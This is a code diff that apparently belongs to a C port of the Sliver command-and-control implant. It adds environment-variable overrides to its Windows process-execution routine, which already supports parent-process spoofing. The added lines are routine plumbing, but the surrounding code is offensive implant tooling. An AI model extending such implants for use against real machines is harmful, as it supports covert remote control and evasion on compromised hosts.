@@ -130,9 +130,63 @@ static void append_quoted(char *dst, size_t cap, size_t *offset, const char *arg
   }
 }
 
+/* Builds a Windows environment block (K=V\0...\0\0) that inherits the parent
+ * environment and applies the requested overrides, mirroring the Go implant's
+ * `append(os.Environ(), req.Env...)`. Returns NULL when env_count == 0 (inherit). */
+static char *build_env_block(const sliver_exec_env_t *env, size_t env_count) {
+  char *block;
+  size_t cap;
+  size_t used = 0;
+  const char *parent;
+
+  if (env_count == 0) {
+    return NULL;
+  }
+  cap = 32u * 1024u;
+  block = (char *)malloc(cap);
+  if (block == NULL) {
+    return NULL;
+  }
+  block[0] = '\0';
+
+  parent = (const char *)GetEnvironmentStringsA();
+  if (parent != NULL) {
+    const char *p = parent;
+    while (*p != '\0') {
+      size_t len = strlen(p);
+      const char *eq = strchr(p, '=');
+      size_t key_len = eq != NULL ? (size_t)(eq - p) : len;
+      int skip = 0;
+      for (size_t i = 0; i < env_count; ++i) {
+        if (strlen(env[i].key) == key_len && strncmp(p, env[i].key, key_len) == 0) {
+          skip = 1;
+          break;
+        }
+      }
+      if (!skip && used + len + 1 < cap) {
+        memcpy(block + used, p, len + 1);
+        used += len + 1;
+      }
+      p += len + 1;
+    }
+    (void)FreeEnvironmentStringsA((LPCH)parent);
+  }
+
+  for (size_t i = 0; i < env_count; ++i) {
+    int n = snprintf(block + used, cap - used, "%s=%s", env[i].key, env[i].value);
+    if (n < 0 || (size_t)n >= cap - used - 2) {
+      break;
+    }
+    used += (size_t)n + 1;
+  }
+  block[used] = '\0'; /* double-NUL terminator */
+  return block;
+}
+
 int sliver_proc_exec(const char *path, const char *const *args, size_t argc, int capture,
                      sliver_buf_t *out, sliver_buf_t *err, uint32_t *pid_out,
-                     uint32_t *status_out, uint32_t ppid) {
+                     uint32_t *status_out, uint32_t ppid,
+                     const sliver_exec_env_t *env, size_t env_count) {
   SECURITY_ATTRIBUTES sa;
   STARTUPINFOEXA si;
   PROCESS_INFORMATION pi;
@@ -140,6 +194,7 @@ int sliver_proc_exec(const char *path, const char *const *args, size_t argc, int
   HANDLE h_parent = NULL;
   HANDLE out_r = NULL, out_w = NULL, err_r = NULL, err_w = NULL;
   char cmdline[8192];
+  char *env_block = NULL;
   size_t offset = 0;
   DWORD exit_code = 0;
   DWORD create_flags = 0;
@@ -214,9 +269,12 @@ int sliver_proc_exec(const char *path, const char *const *args, size_t argc, int
   {
     char resolved[MAX_PATH * 2];
     resolve_exe(path, resolved, sizeof(resolved));
-    if (!CreateProcessA(resolved, cmdline, NULL, NULL, TRUE, create_flags, NULL, NULL,
+    env_block = build_env_block(env, env_count);
+    if (!CreateProcessA(resolved, cmdline, NULL, NULL, TRUE, create_flags, env_block, NULL,
                         &si.StartupInfo, &pi)) {
     g_last_error = GetLastError();
+      free(env_block);
+      env_block = NULL;
       if (attr != NULL) {
         (void)DeleteProcThreadAttributeList(attr);
       }
@@ -238,6 +296,8 @@ int sliver_proc_exec(const char *path, const char *const *args, size_t argc, int
   if (h_parent != NULL) {
     (void)CloseHandle(h_parent);
   }
+  free(env_block);
+  env_block = NULL;
   if (capture) {
     (void)CloseHandle(out_w);
     (void)CloseHandle(err_w);
